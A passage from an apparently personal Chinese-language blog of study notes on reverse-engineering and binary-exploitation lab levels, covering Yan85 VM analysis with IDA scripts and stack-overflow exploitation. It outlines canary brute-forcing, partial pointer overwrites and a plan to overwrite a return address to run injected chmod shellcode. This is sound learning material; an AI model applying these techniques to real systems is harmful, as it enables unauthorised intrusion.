class="hljs-built_in">list</span> = <span class="hljs-built_in">str</span>.split(<span class="hljs-string">&quot; &quot;</span>)<br><span class="hljs-built_in">list</span>[<span class="hljs-number">22</span>], <span class="hljs-built_in">list</span>[<span class="hljs-number">27</span>] = <span class="hljs-built_in">list</span>[<span class="hljs-number">27</span>], <span class="hljs-built_in">list</span>[<span class="hljs-number">22</span>]<br><span class="hljs-built_in">list</span>.reverse()<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>)<br><span class="hljs-comment">#print(len(list))</span><br><span class="hljs-built_in">list</span> = [<span class="hljs-built_in">int</span>(x,<span class="hljs-number">16</span>) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">27</span>,<span class="hljs-number">2</span>):<br>    <span class="hljs-built_in">list</span>[i] ^= <span class="hljs-number">0x95</span><br>    <span class="hljs-built_in">list</span>[i+<span class="hljs-number">1</span>] ^= <span class="hljs-number">0x56</span><br><span class="hljs-built_in">list</span>[<span class="hljs-number">28</span>] ^= <span class="hljs-number">0x95</span> <span class="hljs-comment">#奇数个.....</span><br><span class="hljs-built_in">list</span>.reverse()<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>)<br><br><br>byte = <span class="hljs-string">b&#x27;&#x27;</span>.join([x.to_bytes(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;big&#x27;</span>) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>]) <span class="hljs-comment">#什么需求直接谷歌比看文档快多了, 特别是这种简单语法......</span><br><span class="hljs-built_in">print</span>(byte)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/root/Desktop/input&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> o:<br>    o.write(byte)                                                                              <br></code></pre></div></td></tr></table></figure>

<h3 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h3><p>这合理吗? 就硬堆数量……</p>
<h3 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h3><blockquote>
<p>噢, 有点东西, 完全看不出来发生了什么, 得反汇编看看.</p>
<p>用的md5, 没有办法reverse, 但是可以修改代码内容. </p>
</blockquote>
<ul>
<li>IDA 添加类型 在shift+f1的local types中添加. 也就是view中的open subviews. ctrl+1=quick view</li>
<li>gdb 与 set-uid 程序 与 $base</li>
<li>IDA number of operand.</li>
</ul>
<p>因为使用了<code>mprotect()</code>可以修改代码段, 所以直接找到jnz的地方改成jz. 也就是0x1f01处从75改成74.</p>
<h3 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h3><p>使用bin_pedding函数把main函数填充到了2xxx的相对地址处, 不过同上.</p>
<h3 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h3><blockquote>
<p>IDA的rename选项在手册的Give Name to the Location章, 查了下LOCAL and PUBLIC伪指令</p>
<p>我还得查下md5函数怎么用.</p>
</blockquote>
<p>直接把整个程序的每个部分进行一个hash, 所以修改其他地方无法通过验证. 而且只能修改2byte.</p>
<p>没事了, 连着改两个jnz就行了.</p>
<h3 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h3><blockquote>
<p>开始Yan85</p>
</blockquote>
<ul>
<li>LOAD segment 只是个没有名字的段, IDA默认整个名字上去. 可以在段介绍中看到pure data/code之类的.</li>
<li>递归学习:<ul>
<li>在IDA看到一个<code>text &quot;UTF-16LE&quot;, &#39;abcdsif&#39;</code>, 还以为七个字符是连在一起的. 结果发现UTF-16LE有特别的地方. 直接改成DATA就会出现\0间隔的字符.</li>
<li>然后就去查16LE是什么. 其实就是UTF-16的little-endian版本. Byte-Order-Mark etc.</li>
<li><strong>UTF-8优势在于ascii是1byte, 16优势在于非ascii是两字节, 32在于不用encoding and decoding</strong>.</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm"># memset的一种实现方法, store string from rax by addr in rdi and counter in rcx.<br>lea	rdx，[rbp+var_110]<br>mov	eax， 0<br>mov	ecx，20h ;<br>mov rdi,rdx<br>rep stosq<br></code></pre></div></td></tr></table></figure>

<hr>
<p>Yan85: a1, a2, a3是arg no.</p>
<ul>
<li><p>在main函数中一个256字节的空间(char a1[256+7]), 后面跟着7byte用作七个寄存器的空间. 然后进入execute_program.</p>
</li>
<li><p>describe_register是将数字转换成一个字符, 总共有七个, 每个字符后面都有\0: <code>aNone           db &#39;NONE&#39;,0</code> </p>
</li>
<li><p>describe_* 后面的level可能会用到, 到时再说</p>
</li>
<li><p>write_register是将a2用作a1[256~262]的索引, 然后将a3写入数组中.</p>
<p><strong>寄存器 <code>r1 r2 r3 r4 r5 r6 r7</code></strong>  </p>
<p>**分别是 <code>8  4  64 32 16 2  1 </code> ** </p>
</li>
<li><p>write_memory被用在stm指令中</p>
</li>
</ul>
<p>然后分析<strong>每个指令</strong>作用: (reg)表示标号对应的寄存器的值.</p>
<ul>
<li>imm 就是     <code>(reg)a2 = a3</code> 加载立即数.</li>
<li>stm其实就是<code>mov [(reg)a2 + a1], a3</code> </li>
<li>syscall(a1, a2, a3), 假设寄存器为<strong>r1 r2 ~ r6</strong>, 然后<strong>if a2 == …</strong> <ul>
<li>8: open <code>fd = open(&amp;a1[r1], r2, r3); (reg)a3 = fd;</code> </li>
<li>4: read <code>v5 = r3+r2&gt;=256 ? -r2 : r3; count = read(r1, &amp;a1[r2], v5)</code> 然后count写入reg a3</li>
<li>1: write <code>v5 = r3+r2&gt;=256 ? -r2 : r3; count = write(r1, &amp;a1[r2], v5)</code> 然后count写入reg a3</li>
<li>16: sleep r1 secs, (reg)a3 = left_time</li>
<li>0x20: <code>exit(r1)</code> </li>
<li>else:  <code>exit( (reg)a3 )</code> </li>
</ul>
</li>
</ul>
<p>如果是12.1, 估计我写个gdb脚本会更方便我查看执行流程. 在每个函数入口处dumpargs, 然后打印出来. 12.0我就直接看看提示.</p>
<p>woc, 12.1都没有函数名称的, 我还得重命名一下函数. </p>
<p>看了前面的一点, 只要<code>printf &quot;\x94\x11\x3f\xb3&quot; &gt; input</code> 就行. 自动读取flag.</p>
<h3 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h3><blockquote>
<ul>
<li>ldm: load from memory: <code>(reg)a2 = a1[(reg)a3]</code> </li>
<li>cmp: 两个寄存器结果放在a1[262]里, 第五位作为标志位, <figure class="highlight ada"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ada">小于 : 16  	第5位<br>大于 : 8		第4位<br>等于 : 4 		第3位<br>不等于: <span class="hljs-number">2</span>      第<span class="hljs-number">2</span>位<br>两个全为零:<span class="hljs-number">1</span>   第<span class="hljs-number">1</span>位<br></code></pre></div></td></tr></table></figure></li>
<li><strong>寄存器 <code>r1 r2 r3 r4 r5 r6 r7</code></strong><br>**分别是 <code>16 64 1  4  8  32 2 </code> ** </li>
</ul>
</blockquote>
<p>看视频看到了新方法.</p>
<ul>
<li>遇到了一个指令解析错误, 只能undefine<code>crash</code>函数, 然后把字节设置成指令 设置函数end 设置新函数.</li>
<li>完全可以只用静态分析, 既然256字节空间之后跟着的是7个register, 那么可以定义一个结构体, 这样decompilerd result会更准确.</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">state</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-keyword">char</span> memory[<span class="hljs-number">256</span>];<br>  <span class="hljs-keyword">unsigned</span> __int8 r1;<br>  <span class="hljs-keyword">unsigned</span> __int8 r2;<br>  <span class="hljs-keyword">unsigned</span> __int8 r3;<br>  <span class="hljs-keyword">unsigned</span> __int8 r4;<br>  <span class="hljs-keyword">unsigned</span> __int8 r5;<br>  <span class="hljs-keyword">unsigned</span> __int8 r6;<br>  <span class="hljs-keyword">unsigned</span> __int8 r7;<br>&#125;;<br></code></pre></div></td></tr></table></figure>

<ul>
<li>对于describe_register()函数来说可以定义一个enum变量, 就不用搁那翻译每个寄存器是对应哪个数字了.</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">REGISTER</span> :</span> __int8<br>&#123;<br>  r1 = <span class="hljs-number">0x1</span>,<br>  r3 = <span class="hljs-number">0x2</span>,<br>  r7 = <span class="hljs-number">0x4</span>,<br>  r4 = <span class="hljs-number">0x8</span>,<br>  r2 = <span class="hljs-number">0x10</span>,<br>  r6 = <span class="hljs-number">0x20</span>,<br>  r5 = <span class="hljs-number">0x40</span>,<br>&#125;;<br></code></pre></div></td></tr></table></figure>

<h3 id="level14-1"><a href="#level14-1" class="headerlink" title="level14.1"></a>level14.1</h3><blockquote>
<p>emmmmm好像也没什么意义, 纯粹花时间看懂一个流程罢了. 只是复杂度的简单叠加, 把输入的每个bit进行一个加法操作.</p>
</blockquote>
<p>这题是0x81位置上先放九个数, 然后再分别加上一个数字, 然后, 就那样..</p>
<h3 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h3><p>还是加上一个数, 勉强做一下. 果然是浪费时间.</p>
<h3 id="level16-1"><a href="#level16-1" class="headerlink" title="level16.1"></a>level16.1</h3><blockquote>
<p>开始Yan85 byte code. 直接从没有符号的版本入手开始占卜(</p>
</blockquote>
<p><del>IDA反编译出了问题, 实在是逆转前三个字节顺序的汇编代码太神奇, 一堆符号拓展 零拓展什么的.</del> 然后发现并没有问题.</p>
<p>发现指令编码是这样一个结构:</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inst</span></span><br><span class="hljs-class">&#123;</span><br>  __int8 oprnd_1;<br>  __int8 opcode;<br>  __int8 oprnd_2;<br>  __int8 pedding; <span class="hljs-comment">//useless</span><br>&#125;;<br></code></pre></div></td></tr></table></figure>

<p>在IDA中使用IDC编写脚本(gdb script也行, 也可以设置临时变量之类的).</p>
<h4 id="ADD"><a href="#ADD" class="headerlink" title="ADD"></a>ADD</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">auto</span> reg1 = SIL;<br><span class="hljs-keyword">auto</span> reg2 = (ESI &amp; <span class="hljs-number">0xff0000</span>) &gt;&gt; <span class="hljs-number">16</span>;<br><span class="hljs-keyword">auto</span> s1; <span class="hljs-keyword">auto</span> s2;<br><br><span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">1</span>) s1 = <span class="hljs-string">&quot;r1&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">16</span>) s1 = <span class="hljs-string">&quot;r2&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">4</span>) s1 = <span class="hljs-string">&quot;r3&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">64</span>) s1 = <span class="hljs-string">&quot;r4&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">32</span>) s1 = <span class="hljs-string">&quot;r5&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">8</span>) s1 = <span class="hljs-string">&quot;r6&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">2</span>) s1 = <span class="hljs-string">&quot;r7&quot;</span>;<br><br><span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">1</span>) s2 = <span class="hljs-string">&quot;r1&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">16</span>) s2 = <span class="hljs-string">&quot;r2&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">4</span>) s2 = <span class="hljs-string">&quot;r3&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">64</span>) s2 = <span class="hljs-string">&quot;r4&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">32</span>) s2 = <span class="hljs-string">&quot;r5&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">8</span>) s2 = <span class="hljs-string">&quot;r6&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">2</span>) s2 = <span class="hljs-string">&quot;r7&quot;</span>;<br><br>msg(<span class="hljs-string">&quot;\tADD: %s = %s + %s\n&quot;</span>, s1, s1, s2);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></div></td></tr></table></figure>

<h4 id="POP"><a href="#POP" class="headerlink" title="POP:"></a>POP:</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">auto</span> reg1 = (get_wide_dword(RBP<span class="hljs-number">-0x10</span>) &amp; <span class="hljs-number">0xff</span>);<br><span class="hljs-keyword">auto</span> s1;<br><br><span class="hljs-comment">//省略判断寄存器名称的部分代码</span><br><br>msg(<span class="hljs-string">&quot;\tPOP: %s=0x%x is %c, rsp=0x%x\n&quot;</span>, s1, RDX, RDX, RSI<span class="hljs-number">-1</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></div></td></tr></table></figure>

<h4 id="STM"><a href="#STM" class="headerlink" title="STM:"></a>STM:</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">auto</span> reg1 = get_wide_byte(RBP<span class="hljs-number">-0x20</span>) &amp; <span class="hljs-number">0xff</span>;<br><span class="hljs-keyword">auto</span> reg2 = (get_wide_dword(RBP<span class="hljs-number">-0x20</span>) &amp; <span class="hljs-number">0xff0000</span>) &gt;&gt; <span class="hljs-number">16</span>;<br><span class="hljs-keyword">auto</span> s1; <span class="hljs-keyword">auto</span> s2;<br><br><span class="hljs-comment">//省略判断寄存器名称的部分代码</span><br><br>msg(<span class="hljs-string">&quot;\tSTM: *%s = %s\n&quot;</span>, s1, s2);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></div></td></tr></table></figure>

<h4 id="LDM"><a href="#LDM" class="headerlink" title="LDM:"></a>LDM:</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">auto</span> reg1 = get_wide_byte(RBP<span class="hljs-number">-0x10</span>) &amp; <span class="hljs-number">0xff</span>;<br><span class="hljs-keyword">auto</span> reg2 = (get_wide_dword(RBP<span class="hljs-number">-0x10</span>) &amp; <span class="hljs-number">0xff0000</span>) &gt;&gt; <span class="hljs-number">16</span>;<br><span class="hljs-keyword">auto</span> s1; <span class="hljs-keyword">auto</span> s2;<br><br><span class="hljs-comment">//省略判断寄存器名称的部分代码</span><br><br><span class="hljs-keyword">auto</span> mem = AL;<br>msg(<span class="hljs-string">&quot;\tLDM: %s = *(%s); mem:0x%x\n&quot;</span>, s1, s2, mem);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></div></td></tr></table></figure>

<h4 id="CMP"><a href="#CMP" class="headerlink" title="CMP:"></a>CMP:</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">auto</span> reg1 = get_wide_byte(RBP<span class="hljs-number">-0x20</span>) &amp; <span class="hljs-number">0xff</span>;<br><span class="hljs-keyword">auto</span> reg2 = (get_wide_dword(RBP<span class="hljs-number">-0x20</span>) &amp; <span class="hljs-number">0xff0000</span>) &gt;&gt; <span class="hljs-number">16</span>;<br><span class="hljs-keyword">auto</span> s1; <span class="hljs-keyword">auto</span> s2;<br><br><span class="hljs-comment">//省略判断寄存器名称的部分代码</span><br><br><span class="hljs-keyword">auto</span> r1=get_wide_byte(RBP<span class="hljs-number">-0x2</span>);<br><span class="hljs-keyword">auto</span> r2=get_wide_byte(RBP<span class="hljs-number">-0x1</span>);<br>msg(<span class="hljs-string">&quot;\tCMP: %s:%s 0x%x:0x%x\n&quot;</span>, s1, s2, r1, r2);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></div></td></tr></table></figure>

<h4 id="print-all-regs"><a href="#print-all-regs" class="headerlink" title="print all regs:"></a>print all regs:</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">auto</span> r1=get_wide_byte(RDI+<span class="hljs-number">1024</span>);<br><span class="hljs-keyword">auto</span> r2=get_wide_byte(RDI+<span class="hljs-number">1025</span>);<br><span class="hljs-keyword">auto</span> r3=get_wide_byte(RDI+<span class="hljs-number">1026</span>);<br><span class="hljs-keyword">auto</span> r4=get_wide_byte(RDI+<span class="hljs-number">1027</span>);<br><span class="hljs-keyword">auto</span> r5=get_wide_byte(RDI+<span class="hljs-number">1028</span>);<br><span class="hljs-keyword">auto</span> r6=get_wide_byte(RDI+<span class="hljs-number">1029</span>);<br><span class="hljs-keyword">auto</span> r7=get_wide_byte(RDI+<span class="hljs-number">1030</span>);<br><br>msg(<span class="hljs-string">&quot;\t    [V] r1:0x%x r2:0x%x r3:0x%x r4:0x%x r5:0x%x r6:0x%x r7:0x%x\n&quot;</span>, r1,r2,r3,r4,r5,r6,r7);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></div></td></tr></table></figure>

<p>设置完之后就会出现非常漂亮的一个输出, 不过很长, 而且这种输出是会跟着程序流变化的, 不利于整体上的静态分析. 下次尝试避开所有跳转, 按顺序打印出所有的代码, 不然跳来跳去的真的很难看.</p>
<p>结果就是简单的判断字符串相等, 总共9字节. 都在log文件里.</p>
<h3 id="level17-1"><a href="#level17-1" class="headerlink" title="level17"></a>level17</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">2</span>) s1 = <span class="hljs-string">&quot;r1&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">32</span>) s1 = <span class="hljs-string">&quot;r2&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">16</span>) s1 = <span class="hljs-string">&quot;r3&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">1</span>) s1 = <span class="hljs-string">&quot;r4&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">4</span>) s1 = <span class="hljs-string">&quot;r5&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">64</span>) s1 = <span class="hljs-string">&quot;r6&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">8</span>) s1 = <span class="hljs-string">&quot;r7&quot;</span>;<br><br><span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">2</span>) s1 = <span class="hljs-string">&quot;r1&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">32</span>) s2 = <span class="hljs-string">&quot;r2&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">16</span>) s2 = <span class="hljs-string">&quot;r3&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">1</span>) s2 = <span class="hljs-string">&quot;r4&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">4</span>) s2 = <span class="hljs-string">&quot;r5&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">64</span>) s2 = <span class="hljs-string">&quot;r6&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">8</span>) s2 = <span class="hljs-string">&quot;r7&quot;</span>;<br></code></pre></div></td></tr></table></figure>

<p>先跳过, 感觉就是复杂度的堆积, 又或者是我方向错了. 到时回来看.</p>
<h3 id="level18"><a href="#level18" class="headerlink" title="level18"></a>level18</h3><p>Yan85 shellcoding. 直接做<code>.0</code>题目, 省点事.</p>
<p>输入<code>0x300uLL</code>字节的bytecode, 前768字节是指令最多256条, 后面是内存空间, 再后面是寄存器.</p>
<p>完全由我控制的话首先是往内存中放入/flag字符串, 然后open(path in memory) -&gt; read to memory -&gt; write to stdout. 再结合一下题目里的寄存器, 操作数和顺序就行. 估计得写个python函数自动生成.</p>
<h3 id="level19"><a href="#level19" class="headerlink" title="level19"></a>level19</h3><p>更特别了. 主要是这个<code>rerandomize()</code>函数, 其中寄存器, 指令, 系统调用, cmp标志位全部都是随机的. 随机的方法是8个int8随机选取两个进行交换, 执行65535次.</p>
<p>难道是在变化中找到不变的东西?</p>
<p>噢虽然是随机的但是由于rand的特点(种子和flag有关), 每次的值都不会变, 这样子只要编写一些logic去brute force一些指令和值就可以了.</p>
<h1 id="module-8-exp"><a href="#module-8-exp" class="headerlink" title="module 8-exp"></a>module 8-exp</h1><ul>
<li>时至2022年4月22日, c语言排名<a target="_blank" rel="noopener" href="https://www.tiobe.com/tiobe-index/">第二位</a>, 历史最低为第二位. 大部分逆向工具反编译出的结果都是类C语言, 因为c语言是最接近汇编的语言, 还给了开发者一种使用高级语言而不是直接通过汇编去操作寄存器的选择, 被大量使用在操作系统和其他软件的代码中. 而c语言的内存完全控制所带来的问题在near future不会消失, 比如说一些嵌入式设备需要c语言来开发等等.</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>r = gdb.debug(<span class="hljs-string">&#x27;./balabala&#x27;</span>)<br>test_string = cyclic(<span class="hljs-number">128</span>) 	<span class="hljs-comment"># used to identify the location of overflow string</span><br>cyclic_find(<span class="hljs-string">&quot;gaaa&quot;</span>)<br></code></pre></div></td></tr></table></figure>

<ul>
<li><p>stack canary mitigations:</p>
<ul>
<li><p><strong>leak the canary.</strong> </p>
</li>
<li><p><strong>brute-force the canary(for forking processes)</strong> </p>
</li>
<li><p><strong>modify the canary.</strong>  </p>
</li>
<li><p>by forking processes, it can test repeatedly and figure out what the canary is.</p>
</li>
<li><p>the canary begins with null-byte.</p>
</li>
</ul>
</li>
<li><p>alsr mitigation:</p>
<ul>
<li>because all segments are aligned to 0x1000, so changing the least significant byte in a pointer can redirect the flow to another position.</li>
<li><code>setarch x86_64 -R /bin/zsh</code> command</li>
</ul>
</li>
<li><p>uninitilized data.</p>
<ul>
<li>but gcc with high level optimization will probably remove the memset function, as it seems to be pointless.</li>
</ul>
</li>
</ul>
<hr>
<ul>
<li>整了pwndbg+tmux的组合视图, 感觉, 有一点点点点用吧…<p hidden>我是真有精力搞这个…</p>成功在tmux里面套娃screen.</li>
<li>使用gdb加上core文件 <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/8305866/">stackoverflow</a> <ul>
<li><strong>ulimit -c unlimited</strong> : 解除core dump文件大小限制, 或者直接加在zshrc里面.</li>
<li>然后<code>gdb-pwndbg [filename] [coredump]</code> </li>
<li>视频中使用了cyclic加上gdb core来查看返回地址从而发现buf的溢出位置.</li>
<li>也可以使用valgrind, 不过参数较多.</li>
<li>pwn也有coredump函数.</li>
</ul>
</li>
</ul>
<h4 id="level1-2"><a href="#level1-2" class="headerlink" title="level1-2"></a>level1-2</h4><p>简单的忘记了</p>
<h4 id="level3-4"><a href="#level3-4" class="headerlink" title="level3-4"></a>level3-4</h4><p>修改返回地址. </p>
<h4 id="level5-2"><a href="#level5-2" class="headerlink" title="level5"></a>level5</h4><p>gdb 调试出现问题, read一个大数字就会bad address, 直接执行没有出现….</p>
<h4 id="level6-2"><a href="#level6-2" class="headerlink" title="level6"></a>level6</h4><p>重复利用堆栈, 修改返回地址后顺手改写rbp+0x4开始的四字节为0x1337(4919)</p>
<p>challenge堆栈有没有实用的位置, 应该就是对齐.</p>
<p>发现没啥特别的, 就是固定0x40000地址, 然后跳过win_auth的验证条件直接执行read flag</p>
<h4 id="level7-1"><a href="#level7-1" class="headerlink" title="level7"></a>level7</h4><p>和rev的18题差不多, 但是Yan85的open syscall被禁用. 他说有个memory error, 在哪里呢.</p>
<p>保护全关, 可执行栈. 根本没有open这个libc函数, 需要hijack shellcode, 注入到哪里呢? </p>
<p>发现了, 一个read到栈空间的调用没有检查边界:</p>
<img src="../../image/pwn-modules/image-20220503162403150.png" srcset="/img/loading.gif" lazyload alt="image-20220503162403150" style="zoom:80%;" />

<ul>
<li>不过要注意r2和r3只有1字节, 最多就是256. </li>
<li>反正各种保护都没开, 可以直接定位shellcode的位置. 总共长36字节.</li>
<li>shellcode得调用syscall, 还是用chmod简单点, shellcode就加在一开始的byte code中. 对shellcode进行Yan85译码可能会出问题, 在byte code结束之前还要修改r6的值来直接跳到指令的末尾.</li>
<li>Yan85 code直接从memory[1024]开始, 覆盖8B register, 9B stack space, 8B saved rbp, and finally, the <code>retaddr</code> to the position of shellcode. <ul>
<li>还有一些细节, 覆盖r6的时候可以直接修改成256在下一次译码结束执行, 这样子就不用多余的操作修改r6.</li>
</ul>
</li>
</ul>
